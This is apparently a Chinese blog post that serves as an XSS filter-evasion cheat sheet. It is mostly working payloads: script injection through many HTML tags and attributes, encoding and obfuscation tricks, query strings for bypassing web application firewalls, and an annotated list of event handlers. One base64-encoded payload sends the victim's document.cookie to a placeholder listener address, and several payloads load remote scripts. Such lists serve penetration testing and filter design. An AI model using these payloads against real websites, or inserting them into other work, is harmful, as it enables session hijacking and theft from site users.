<p><code>&lt;/script&gt;&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;</code></p></li>
<li><p>html标签常规属性或方法</p>
<pre class="line-numbers"><code class="language-javascript">&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);&lt;/SCRIPT&gt;
&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;<br/>
&lt;BODY BACKGROUND=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;<br/>
&lt;IMG DYNSRC=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;<br/>
&lt;IMG LOWSRC=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;<br/>
&lt;svg/onload=alert(&#39;XSS&#39;)&gt;<br/>
&lt;BODY ONLOAD=alert(&#39;XSS&#39;)&gt;    这里还可以在等号后面加一个空格， (&quot;onload=&quot; 不等于 &quot;onload =&quot;)
</code></pre></li>
<li><p>img标签中使用VBscript</p>
<pre class="line-numbers"><code class="language-&lt;img"></code></pre></li>
<li><p>ECMAScript 6</p>
<pre class="line-numbers"><code class="language-javascript">Set.constructor`alert \ x28document.domain \ x29
</code></pre></li>
<li><p>其他不常见的标签</p>
<pre class="line-numbers"><code class="language-javascript">&lt;BGSOUND SRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;
&lt;BR SIZE=&quot;&amp;{alert(&#39;XSS&#39;)}&quot;&gt;<br/>
&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;    适用于IE<br/>
&lt;STYLE&gt;@import&#39;http://xss.rocks/xss.css&#39;;&lt;/STYLE&gt;    用于google桌面，不能使用斜杠或等号的时候，这个payload很有用<br/>
&lt;META HTTP-EQUIV=&quot;Link&quot; Content=&quot;&lt;http://xss.rocks/xss.css&gt;; REL=stylesheet&quot;&gt;<br/>
&lt;STYLE&gt;BODY{-moz-binding:url(&quot;http://xss.rocks/xssmoz.xml#xss&quot;)}&lt;/STYLE&gt;    仅适用于Gecko渲染引擎<br/>
&lt;STYLE&gt;@im\port&#39;\ja\vasc\ript:alert(&quot;XSS&quot;)&#39;;&lt;/STYLE&gt;    这个xss有时会将ie发送到无限循环的警报中<br/>
&lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(alert(&#39;XSS&#39;))&quot;&gt;    由罗曼伊万诺夫创建<br/>
exp/*&lt;A STYLE=&#39;no\xss:noxss(&quot;*//*&quot;);xss:ex/*XSS*//*/*/pression(alert(&quot;XSS&quot;))&#39;&gt;     混合表达式，可以将ie发送到无限循环中<br/>
&lt;STYLE&gt;.XSS{background-image:url(&quot;javascript:alert(&#39;XSS&#39;)&quot;);}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;  使用背景图像的style标签<br/>
&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert(&#39;XSS&#39;)&quot;)}&lt;/STYLE&gt;    使用背景的style标记<br/>
&lt;IFRAME SRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;&lt;/IFRAME&gt;<br/>
&lt;IFRAME SRC=# onmouseover=&quot;alert(document.cookie)&quot;&gt;&lt;/IFRAME&gt;<br/>
&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;&lt;/FRAMESET&gt;<br/>
&lt;TABLE BACKGROUND=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;<br/>
&lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;<br/>
&lt;BASE HREF=&quot;javascript:alert(&#39;XSS&#39;);//&quot;&gt;<br/>
&lt;OBJECT TYPE=&quot;text/x-scriptlet&quot; DATA=&quot;http://xss.rocks/scriptlet.html&quot;&gt;&lt;/OBJECT&gt;  这里可以注入病毒<br/>
EMBED SRC=&quot;http://ha.ckers.Using EMBED标签你可以嵌入一个包含XSS的Flash电影。点击这里进行演示。如果添加属性 allowScriptAccess=&quot;never&quot; and allownetworking=&quot;internal&quot; 它可以减轻这种风险(感谢Jonathan Vanasco提供的信息).:<br/>
org/xss.swf&quot; AllowScriptAccess=&quot;always&quot;&gt;&lt;/EMBED&gt;    可以嵌入flash影片<br/>
&lt;EMBED SRC=&quot;data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==&quot; type=&quot;image/svg+xml&quot; AllowScriptAccess=&quot;always&quot;&gt;&lt;/EMBED&gt;    这个仅适用于火狐<br/>
a=&quot;get&quot;;<br/>
b=&quot;URL(\&quot;&quot;;<br/>
c=&quot;javascript:&quot;;<br/>
d=&quot;alert(&#39;XSS&#39;);\&quot;)&quot;;<br/>
eval(a+b+c+d);    <br/>
可以使用actionscript模糊xss payload<br/>
&lt;XML ID=&quot;xss&quot;&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=&quot;javas&lt;!-- --&gt;cript:alert(&#39;XSS&#39;)&quot;&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;<br/>
&lt;SPAN DATASRC=&quot;#xss&quot; DATAFLD=&quot;B&quot; DATAFORMATAS=&quot;HTML&quot;&gt;&lt;/SPAN&gt;    适合IE<br/>
&lt;XML SRC=&quot;xsstest.xml&quot; ID=I&gt;&lt;/XML&gt;<br/>
&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;<br/>
&lt;HTML&gt;&lt;BODY&gt;<br/>
&lt;?xml:namespace prefix=&quot;t&quot; ns=&quot;urn:schemas-microsoft-com:time&quot;&gt;<br/>
&lt;?import namespace=&quot;t&quot; implementation=&quot;#default#time2&quot;&gt;<br/>
&lt;t:set attributeName=&quot;innerHTML&quot; to=&quot;XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;<br/>
&lt;/BODY&gt;&lt;/HTML&gt;    仅在html和body标签之间才能工作<br/>
&lt;SCRIPT SRC=&quot;http://xss.rocks/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;    可以将javascript文件重命名为xss payload 的图像<br/>
&lt;!--#exec cmd=&quot;/bin/echo &#39;&lt;SCR&#39;&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo &#39;IPT SRC=http://xss.rocks/xss.js&gt;&lt;/SCRIPT&gt;&#39;&quot;--&gt;    需要服务器安装ssl<br/>
&lt;? echo(&#39;&lt;SCR)&#39;;<br/>
echo(&#39;IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&#39;); ?&gt;    需要服务器安装php<br/>
&lt;IMG SRC=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&gt;<br/>
Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser<br/>
&lt;META HTTP-EQUIV=&quot;Set-Cookie&quot; Content=&quot;USERID=&lt;SCRIPT&gt;alert(&#39;XSS&#39;)&lt;/SCRIPT&gt;&quot;&gt;    修改cookie<br/>
&lt;HEAD&gt;&lt;META HTTP-EQUIV=&quot;CONTENT-TYPE&quot; CONTENT=&quot;text/html; charset=UTF-7&quot;&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert(&#39;XSS&#39;);+ADw-/SCRIPT+AD4-    utf-7编码，在google的404脚本中找到了这个漏洞
</code></pre></li>
<li><p>本地htc文件</p>
<p><code>&lt;XSS STYLE=&quot;behavior: url(xss.htc);&quot;&gt;</code></p></li>
<li><p>US-ASCII编码</p>
<p>US-ASCII编码（由Kurt Huwig发现）。这使用7位而不是8位的格式错误的ASCII编码。此XSS可能绕过许多内容过滤器，但仅在主机以US-ASCII编码传输时，或者如果您自己设置编码时才有效。这对于Web应用程序防火墙跨站点脚本规避而言比对服务器端过滤器规避更有用。Apache Tomcat是唯一以US-ASCII编码传输的已知服务器。</p>
<p><code>¼script¾alert(¢XSS¢)¼/script¾</code></p></li>
<li><p>META标签</p>
<p>&lt;<em>meta</em>&gt; 元素可提供有关页面的元信息(<em>meta</em>-information),比如针对搜索引擎和更新频度的描述和关键词。</p>
<p><code>&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert(&#39;XSS&#39;);&quot;&gt;</code></p>
<p><code>&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;&gt;</code>        base64编码</p>
<p><code>&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javascript:alert(&#39;XSS&#39;);&quot;&gt;</code></p></li>
<li><p>DIV标签</p>
<p><code>&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&#39;XSS&#39;))&quot;&gt;</code></p>
<ul>
<li>具有单一编码xss漏洞的div背景图像</li>
</ul>
<p><code>&lt;DIV STYLE=&quot;background-image:\0075\0072\006C\0028&#39;\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029&#39;\0029&quot;&gt;</code></p>
<ul>
<li>包含十六禁止</li>
</ul>
<p><code>&lt;DIV STYLE=&quot;background-image: url(&amp;#1;javascript:alert(&#39;XSS&#39;))&quot;&gt;</code></p>
<ul>
<li>div表达式</li>
</ul>
<p><code>&lt;DIV STYLE=&quot;width: expression(alert(&#39;XSS&#39;));&quot;&gt;</code></p></li>
<li><p>下层隐藏块(注释)</p>
<pre class="line-numbers"><code class="language-javascript">&lt;!--[if gte IE 4]&gt;
&lt;SCRIPT&gt;alert(&#39;XSS&#39;);&lt;/SCRIPT&gt;<br/>
&lt;![endif]--&gt;
</code></pre></li>
<li><p>使用html引用封装</p>
<pre class="line-numbers"><code class="language-javascript">&lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;httx://xss.rocks/xss.js&quot;&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT =&quot;&gt;&quot; SRC=&quot;httx://xss.rocks/xss.js&quot;&gt;&lt;/SCRIPT&gt;<br/>
&lt;SCRIPT a=&quot;&gt;&quot; &#39;&#39; SRC=&quot;httx://xss.rocks/xss.js&quot;&gt;&lt;/SCRIPT&gt;<br/>
&lt;SCRIPT &quot;a=&#39;&gt;&#39;&quot; SRC=&quot;httx://xss.rocks/xss.js&quot;&gt;&lt;/SCRIPT&gt;<br/>
&lt;SCRIPT a=`&gt;` SRC=&quot;httx://xss.rocks/xss.js&quot;&gt;&lt;/SCRIPT&gt;<br/>
&lt;SCRIPT a=&quot;&gt;&#39;&gt;&quot; SRC=&quot;httx://xss.rocks/xss.js&quot;&gt;&lt;/SCRIPT&gt;<br/>
&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;httx://xss.rocks/xss.js&quot;&gt;&lt;/SCRIPT&gt;
</code></pre></li>
<li><p>url字符串规避</p>
<p>ip或主机名<br/>
<code>&lt;A HREF=&quot;http://66.102.7.147/&quot;&gt;XSS&lt;/A&gt;</code></p>
<p>url编码</p>
<p><code>&lt;A HREF=&quot;http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D&quot;&gt;XSS&lt;/A&gt;</code></p>
<p>双字节编码</p>
<p><code>&lt;A HREF=&quot;http://1113982867/&quot;&gt;XSS&lt;/A&gt;</code></p>
<p>十六进制编码</p>
<p><code>&lt;A HREF=&quot;http://0x42.0x0000066.0x7.0x93/&quot;&gt;XSS&lt;/A&gt;</code></p>
<p>八进制编码</p>
<p><code>&lt;A HREF=&quot;http://0102.0146.0007.00000223/&quot;&gt;XSS&lt;/A&gt;</code></p>
<p>base64编码</p>
<pre class="line-numbers"><code class="language-javascript">&lt;img onload=&quot;eval(atob(&#39;ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU=&#39;))&quot;&gt;
</code></pre>
<p>混合编码</p>
<pre class="line-numbers"><code class="language-javascript">&lt;A HREF=&quot;h
tt    p://6   6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt;
</code></pre></li>
<li><p>协议解析绕过</p>
<pre class="line-numbers"><code class="language-text">&lt;A HREF=&quot;//www.google.com/&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;//google&quot;&gt;XSS&lt;/A&gt;<br/>
&lt;A HREF=&quot;http://ha.ckers.org@google&quot;&gt;XSS&lt;/A&gt;<br/>
&lt;A HREF=&quot;http://google:ha.ckers.org&quot;&gt;XSS&lt;/A&gt;<br/>
&lt;A HREF=&quot;http://google.com/&quot;&gt;XSS&lt;/A&gt;<br/>
&lt;A HREF=&quot;http://www.google.com./&quot;&gt;XSS&lt;/A&gt;<br/>
&lt;A HREF=&quot;javascript:document.location=&#39;http://www.google.com/&#39;&quot;&gt;XSS&lt;/A&gt;<br/>
&lt;A HREF=&quot;http://www.google.com/ogle.com/&quot;&gt;XSS&lt;/A&gt;
</code></pre></li>
</ul>

<h2 id="toc_0">字符串转义序列</h2>

<p>HTML和JavaScript中字符“&lt;”的所有可能组合。其中大部分都不会开箱即用，但如上所述，其中许多都可以在某些情况下渲染。</p>

<pre class="line-numbers"><code class="language-text">&lt;
%3C
&amp;lt
&amp;lt;
&amp;LT
&amp;LT;
&amp;#60
&amp;#060
&amp;#0060
&amp;#00060
&amp;#000060
&amp;#0000060
&amp;#60;
&amp;#060;
&amp;#0060;
&amp;#00060;
&amp;#000060;
&amp;#0000060;
&amp;#x3c
&amp;#x03c
&amp;#x003c
&amp;#x0003c
&amp;#x00003c
&amp;#x000003c
&amp;#x3c;
&amp;#x03c;
&amp;#x003c;
&amp;#x0003c;
&amp;#x00003c;
&amp;#x000003c;
&amp;#X3c
&amp;#X03c
&amp;#X003c
&amp;#X0003c
&amp;#X00003c
&amp;#X000003c
&amp;#X3c;
&amp;#X03c;
&amp;#X003c;
&amp;#X0003c;
&amp;#X00003c;
&amp;#X000003c;
&amp;#x3C
&amp;#x03C
&amp;#x003C
&amp;#x0003C
&amp;#x00003C
&amp;#x000003C
&amp;#x3C;
&amp;#x03C;
&amp;#x003C;
&amp;#x0003C;
&amp;#x00003C;
&amp;#x000003C;
&amp;#X3C
&amp;#X03C
&amp;#X003C
&amp;#X0003C
&amp;#X00003C
&amp;#X000003C
&amp;#X3C;
&amp;#X03C;
&amp;#X003C;
&amp;#X0003C;
&amp;#X00003C;
&amp;#X000003C;
\x3c
\x3C
\u003c
\u003C
</code></pre>

<h2 id="toc_1">绕过waf的方法</h2>

<ul>
<li><p>存储型xss</p>
<p>如果攻击者设法通过过滤器过滤xss，则waf无法阻止攻击传导</p></li>
<li><p>发射型xss</p>
<pre class="line-numbers"><code class="language-text">示例: &lt;script&gt; ... setTimeout(\&quot;writetitle()\&quot;,$_GET[xss]) ... &lt;/script&gt;
利用: /?xss=500); alert(document.cookie);//
</code></pre></li>
<li><p>dom型xss</p>
<pre class="line-numbers"><code class="language-text">示例: &lt;script&gt; ... eval($_GET[xss]); ... &lt;/script&gt;
利用: /?xss=document.cookie
</code></pre></li>
<li><p>xss通过请求重定向</p>
<p>易受攻击的代码</p>
<pre class="line-numbers"><code class="language-text">...
header(&#39;Location: &#39;.$_GET[&#39;param&#39;]);<br/>
...<br/>
以及<br/>
...<br/>
header(&#39;Refresh: 0; URL=&#39;.$_GET[&#39;param&#39;]);<br/>
...
</code></pre>
<p>此请求不会通过waf：</p>
<p><code>/?param=javascript:alert(document.cookie)</code></p>
<p>此请求将通过waf，并且将在某些浏览器中执行</p>
<p><code>/?param=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=</code></p></li>
<li><p>用户xss的 waf bypass 字符串</p>
<pre class="line-numbers"><code class="language-javascript">&lt;Img src = x onerror = &quot;javascript: window.onerror = alert; throw XSS&quot;&gt;
&lt;Video&gt; &lt;source onerror = &quot;javascript: alert (XSS)&quot;&gt;<br/>
&lt;Input value = &quot;XSS&quot; type = text&gt;<br/>
&lt;applet code=&quot;javascript:confirm(document.cookie);&quot;&gt;<br/>
&lt;isindex x=&quot;javascript:&quot; onmouseover=&quot;alert(XSS)&quot;&gt;<br/>
&quot;&gt;&lt;/SCRIPT&gt;”&gt;’&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;<br/>
&quot;&gt;&lt;img src=&quot;x:x&quot; onerror=&quot;alert(XSS)&quot;&gt;<br/>
&quot;&gt;&lt;iframe src=&quot;javascript:alert(XSS)&quot;&gt;<br/>
&lt;object data=&quot;javascript:alert(XSS)&quot;&gt;<br/>
&lt;isindex type=image src=1 onerror=alert(XSS)&gt;<br/>
&lt;img src=x:alert(alt) onerror=eval(src) alt=0&gt;<br/>
&lt;img  src=&quot;x:gif&quot; onerror=&quot;window[&#39;al\u0065rt&#39;](0)&quot;&gt;&lt;/img&gt;<br/>
&lt;iframe/src=&quot;data:text/html,&lt;svg onload=alert(1)&gt;&quot;&gt;<br/>
&lt;meta content=&quot;&amp;NewLine; 1 &amp;NewLine;; JAVASCRIPT&amp;colon; alert(1)&quot; http-equiv=&quot;refresh&quot;/&gt;<br/>
&lt;svg&gt;&lt;script xlink:href=data&amp;colon;,window.open(&#39;https://www.google.com/&#39;)&gt;&lt;/script<br/>
&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=javascript:confirm(1)&quot;&gt;<br/>
&lt;iframe src=javascript&amp;colon;alert&amp;lpar;document&amp;period;location&amp;rpar;&gt;<br/>
&lt;form&gt;&lt;a href=&quot;javascript:\u0061lert(1)&quot;&gt;X<br/>
&lt;/script&gt;&lt;img/*%00/src=&quot;worksinchrome&amp;colon;prompt(1)&quot;/%00*/onerror=&#39;eval(src)&#39;&gt;<br/>
&lt;style&gt;//*{x:expression(alert(/xss/))}//&lt;style&gt;&lt;/style&gt; <br/>
鼠标悬停在上面<br/>
&lt;img src=&quot;/&quot; =_=&quot; title=&quot;onerror=&#39;prompt(1)&#39;&quot;&gt;<br/>
&lt;a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&amp;#97v&amp;#97script:&amp;#97lert(1)&gt;ClickMe<br/>
&lt;script x&gt; alert(1) &lt;/script 1=2<br/>
&lt;form&gt;&lt;button formaction=javascript&amp;colon;alert(1)&gt;CLICKME<br/>
&lt;input/onmouseover=&quot;javaSCRIPT&amp;colon;confirm&amp;lpar;1&amp;rpar;&quot;<br/>
&lt;iframe src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;&lt;/iframe&gt;
</code></pre></li>
<li><p>过滤旁路警报混淆</p>
<pre class="line-numbers"><code class="language-text">(alert)(1)
a=alert,a(1)<br/>
[1].find(alert)<br/>
top[“al”+”ert”](1)<br/>
top[/al/.source+/ert/.source](1)<br/>
al\u0065rt(1)<br/>
top[‘al\145rt’](1)<br/>
top[‘al\x65rt’](1)<br/>
top[8680439..toString(30)](1)
</code></pre></li>
</ul>

<h2 id="toc_2">事件处理程序</h2>

<p>可以参考dottoro的网站<a href="http://help.dottoro.com/ljfvvdnm.php">javascript事件列表</a></p>

<ol>
<li><code>FSCommand()</code> （攻击者可以在嵌入式Flash对象中执行时使用此功能）</li>
<li><code>onAbort()</code> （当用户中止加载图像时）</li>
<li><code>onActivate()</code> （当对象设置为活动元素时）</li>
<li><code>onAfterPrint()</code> （在用户打印或预览打印作业后激活）</li>
<li><code>onAfterUpdate()</code> （在更新源对象中的数据后激活数据对象）</li>
<li><code>onBeforeActivate()</code> （在将对象设置为活动元素之前触发）</li>
<li><code>onBeforeCopy()</code>（攻击者在选择复制到剪贴板之前执行攻击字符串 - 攻击者可以使用该<code>execCommand(&quot;Copy&quot;)</code>功能执行此操作）</li>
<li><code>onBeforeCut()</code> （攻击者在切换选择之前执行攻击字符串）</li>
<li><code>onBeforeDeactivate()</code> （从当前对象更改activeElement后立即触发）</li>
<li><code>onBeforeEditFocus()</code> （在可编辑元素中包含的对象进入UI激活状态或选择了可编辑容器对象的控件之前触发）</li>
<li><code>onBeforePaste()</code>（用户需要被欺骗粘贴或使用该<code>execCommand(&quot;Paste&quot;)</code>功能强制进入它）</li>
<li><code>onBeforePrint()</code>（用户需要被欺骗打印或攻击者可以使用<code>print()</code>或<code>execCommand(&quot;Print&quot;)</code>功能）。</li>
<li><code>onBeforeUnload()</code> （用户需要被欺骗关闭浏览器 - 攻击者无法卸载窗口，除非它是从父级生成的）</li>
<li><code>onBeforeUpdate()</code> （在更新源对象中的数据之前激活数据对象）</li>
<li><code>onBegin()</code> （当元素的时间轴开始时，onbegin事件立即触发）</li>
<li><code>onBlur()</code> （在加载另一个弹出窗口且窗口失去焦点的情况下）</li>
<li><code>onBounce()</code> （当marquee对象的behavior属性设置为“alternate”并且选取框的内容到达窗口的一侧时触发）</li>
<li><code>onCellChange()</code> （数据提供程序中的数据更改时触发）</li>
<li><code>onChange()</code> （select，text或TEXTAREA字段失去焦点，其值已被修改）</li>
<li><code>onClick()</code> （有人点击表格）</li>
<li><code>onContextMenu()</code> （用户需要右键单击攻击区域）</li>
<li><code>onControlSelect()</code> （当用户即将对对象进行控制选择时触发）</li>
<li><code>onCopy()</code>（用户需要复制某些东西或者可以使用该<code>execCommand(&quot;Copy&quot;)</code>命令来利用它）</li>
<li><code>onCut()</code>（用户需要复制某些东西或者可以使用该<code>execCommand(&quot;Cut&quot;)</code>命令来利用它）</li>
<li><code>onDataAvailable()</code> （用户需要更改元素中的数据，否则攻击者可以执行相同的功能）</li>
<li><code>onDataSetChanged()</code> （当数据源对象公开的数据集发生更改时触发）</li>
<li><code>onDataSetComplete()</code> （触发表示所有数据都可从数据源对象获得）</li>
<li><code>onDblClick()</code> （用户双击表单元素或链接）</li>
<li><code>onDeactivate()</code> （当activeElement从当前对象更改为父文档中的另一个对象时触发）</li>
<li><code>onDrag()</code> （要求用户拖动对象）</li>
<li><code>onDragEnd()</code> （要求用户拖动对象）</li>
<li><code>onDragLeave()</code> （要求用户将对象拖离有效位置）</li>
<li><code>onDragEnter()</code> （要求用户将对象拖动到有效位置）</li>
<li><code>onDragOver()</code> （要求用户将对象拖动到有效位置）</li>
<li><code>onDragDrop()</code> （用户将对象（例如文件）放到浏览器窗口中）</li>
<li><code>onDragStart()</code> （当用户开始拖动操作时发生）</li>
<li><code>onDrop()</code> （用户将对象（例如文件）放到浏览器窗口中）</li>
<li><code>onEnd()</code> （当时间线结束时，onEnd事件将触发。</li>
<li><code>onError()</code> （加载文档或图像会导致错误）</li>
<li><code>onErrorUpdate()</code> （在更新数据源对象中的关联数据时发生错误时在数据绑定对象上触发）</li>
<li><code>onFilterChange()</code> （当可视化过滤器完成状态更改时触发）</li>
<li><code>onFinish()</code> （当marquee完成循环时，攻击者可以创建漏洞）</li>
<li><code>onFocus()</code> （攻击者在窗口获得焦点时执行攻击字符串）</li>
<li><code>onFocusIn()</code> （攻击者在窗口获得焦点时执行攻击字符串）</li>
<li><code>onFocusOut()</code> （当窗口失去焦点时，攻击者执行攻击字符串）</li>
<li><code>onHashChange()</code> （当文档的当前地址的片段标识符部分发生更改时触发）</li>
<li><code>onHelp()</code> （攻击者在窗口聚焦时用户点击F1时执行攻击字符串）</li>
<li><code>onInput()</code> （通过用户界面更改元素的文本内容）</li>
<li><code>onKeyDown()</code> （用户按下一个键）</li>
<li><code>onKeyPress()</code> （用户按下或按住键）</li>
<li><code>onKeyUp()</code> （用户发布密钥）</li>
<li><code>onLayoutComplete()</code> （用户必须打印或打印预览）</li>
<li><code>onLoad()</code> （攻击者在窗口加载后执行攻击字符串）</li>
<li><code>onLoseCapture()</code>（可以通过该<code>releaseCapture()</code>方法利用）</li>
<li><code>onMediaComplete()</code> （使用流媒体文件时，此事件可能会在文件开始播放之前触发）</li>
<li><code>onMediaError()</code> （用户在浏览器中打开包含媒体文件的页面，并在出现问题时触发事件）</li>
<li><code>onMessage()</code> （文件收到消息时开火）</li>
<li><code>onMouseDown()</code> （攻击者需要让用户点击图像）</li>
<li><code>onMouseEnter()</code> （光标在对象或区域上移动）</li>
<li><code>onMouseLeave()</code> （攻击者需要让用户将鼠标悬停在图像或表格上然后再关闭）</li>
<li><code>onMouseMove()</code> （攻击者需要让用户将鼠标悬停在图像或表格上）</li>
<li><code>onMouseOut()</code> （攻击者需要让用户将鼠标悬停在图像或表格上然后再关闭）</li>
<li><code>onMouseOver()</code> （光标在对象或区域上移动）</li>
<li><code>onMouseUp()</code> （攻击者需要让用户点击图像）</li>
<li><code>onMouseWheel()</code> （攻击者需要让用户使用他们的鼠标滚轮）</li>
<li><code>onMove()</code> （用户或攻击者会移动页面）</li>
<li><code>onMoveEnd()</code> （用户或攻击者会移动页面）</li>
<li><code>onMoveStart()</code> （用户或攻击者会移动页面）</li>
<li><code>onOffline()</code> （如果浏览器在在线模式下工作并且它开始脱机工作，则会出现）</li>
<li><code>onOnline()</code> （如果浏览器在离线模式下工作并且它开始在线工作，则会出现）</li>
<li><code>onOutOfSync()</code> （中断元素播放时间轴定义的媒体的能力）</li>
<li><code>onPaste()</code>（用户需要粘贴或攻击者可以使用该<code>execCommand(&quot;Paste&quot;)</code>功能）</li>
<li><code>onPause()</code> （onpause事件触发时间线暂停时活动的每个元素，包括body元素）</li>
<li><code>onPopState()</code> （用户导航会话历史记录时触发）</li>
<li><code>onProgress()</code> （攻击者会使用此作为flash电影加载）</li>
<li><code>onPropertyChange()</code> （用户或攻击者需要更改元素属性）</li>
<li><code>onReadyStateChange()</code> （用户或攻击者需要更改元素属性）</li>
<li><code>onRedo()</code> （用户在撤消事务历史记录中前进）</li>
<li><code>onRepeat()</code> （每次重复时间线时，事件都会触发一次，不包括第一个完整周期）</li>
<li><code>onReset()</code> （用户或攻击者重置表单）</li>
<li><code>onResize()</code>（用户将调整窗口的大小，攻击者就可以自动与像初始化：<code>&lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;</code>）</li>
<li><code>onResizeEnd()</code>（用户将调整窗口的大小，攻击者就可以自动与像初始化：<code>&lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;</code>）</li>
<li><code>onResizeStart()</code>（用户将调整窗口的大小，攻击者就可以自动与像初始化：<code>&lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;</code>）</li>
<li><code>onResume()</code> （onresume事件触发时间线恢复时变为活动的每个元素，包括body元素）</li>
<li><code>onReverse()</code> （如果元素的repeatCount大于1，则每次时间轴开始向后播放时都会触发此事件）</li>
<li><code>onRowsEnter()</code> （用户或攻击者需要更改数据源中的行）</li>
<li><code>onRowExit()</code> （用户或攻击者需要更改数据源中的行）</li>
<li><code>onRowDelete()</code> （用户或攻击者需要删除数据源中的行）</li>
<li><code>onRowInserted()</code> （用户或攻击者需要在数据源中插入一行）</li>
<li><code>onScroll()</code>（用户需要滚动，否则攻击者可以使用该<code>scrollBy()</code>功能）</li>
<li><code>onSeek()</code> （当时间轴设置为向前以外的任何方向播放时，onreverse事件将触发）</li>
<li><code>onSelect()</code>（用户需要选择一些文本-攻击者就可以自动与像初始化：<code>window.document.execCommand(&quot;SelectAll&quot;);</code>）</li>
<li><code>onSelectionChange()</code>（用户需要选择一些文本-攻击者就可以自动与像初始化：<code>window.document.execCommand(&quot;SelectAll&quot;);</code>）</li>
<li><code>onSelectStart()</code>（用户需要选择一些文本-攻击者就可以自动与像初始化：<code>window.document.execCommand(&quot;SelectAll&quot;);</code>）</li>
<li><code>onStart()</code> （在每个选框循环开始时触发）</li>
<li><code>onStop()</code> （用户需要按停止按钮或离开网页）</li>
<li><code>onStorage()</code> （存储区域已更改）</li>
<li><code>onSyncRestored()</code> （用户中断元素播放其时间线所定义的媒体的能力）</li>
<li><code>onSubmit()</code> （要求攻击者或用户提交表单）</li>
<li><code>onTimeError()</code> （用户或攻击者将时间属性（例如dur）设置为无效值）</li>
<li><code>onTrackChange()</code> （用户或攻击者更改播放列表中的曲目）</li>
<li><code>onUndo()</code> （用户在撤消事务历史记录中后退）</li>
<li><code>onUnload()</code> （当用户点击任何链接或按下后退按钮或攻击者强制点击时）</li>
<li><code>onURLFlip()</code> （当由HTML + TIME（定时交互式多媒体扩展）媒体标记播放的高级流格式（ASF）文件处理嵌入在ASF文件中的脚本命令时，此事件将触发）</li>
<li><code>seekSegmentTime()</code> （这是一种方法，它定位元素的段时间线上的指定点并从该点开始播放。该段包含一次重复的时间线，包括使用AUTOREVERSE属性进行反向播放。）</li>
</ol>

                        
                      </div>
                  </div>
                </a>
                <div class="read-more clearfix">
                  <div class="more-left left">
                  
                    <span class="date">2018/12/13 16:18 下午</span>
                    <span>posted in&nbsp;</span> 
          				  
          					    <span class="posted-in"><a href='xss%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC.html'>xss跨站脚本</a></span>
          				   
                  </div>
                  <div class="more-right right">
                  <span class="comments">
                      

                       
                  </span>
